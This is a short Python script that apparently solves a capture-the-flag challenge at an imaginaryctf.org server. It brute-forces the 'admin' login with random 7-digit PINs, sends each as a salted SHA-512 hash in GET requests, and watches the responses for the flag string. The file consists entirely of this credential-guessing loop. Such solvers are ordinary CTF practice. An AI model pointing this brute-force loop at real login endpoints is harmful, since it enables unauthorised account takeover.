from random import choice
from hashlib import sha512
import requests
import re
import time
remote = "http://puzzler7.imaginaryctf.org:11005/"

salt = b'very_secure_salt'

class PassHash(str):
    def __str__(self):
        return sha512(salt + self.encode()).hexdigest()

    def __repr__(self):
        return sha512(salt + self.encode()).hexdigest()

for i in range(4782969):
    s = ''.join(choice("0123456789") for i in range(7))
    param = {
        "username": "admin",
        "password": PassHash(s)
    }
    x = requests.get(remote, params=param)
    txt = x.text
    if re.search("jctf", txt):
        print("####################################################")
        print(txt)
        # break
    print(txt)
    time.sleep(0.2)
    print(s)
    print(PassHash(s))

# print("Sorry, we couldn't find a user '{user}' with password hash <code>{{passhash}}</code>!"
#             .format(user=)
#             .format(passhash=new_pwd)
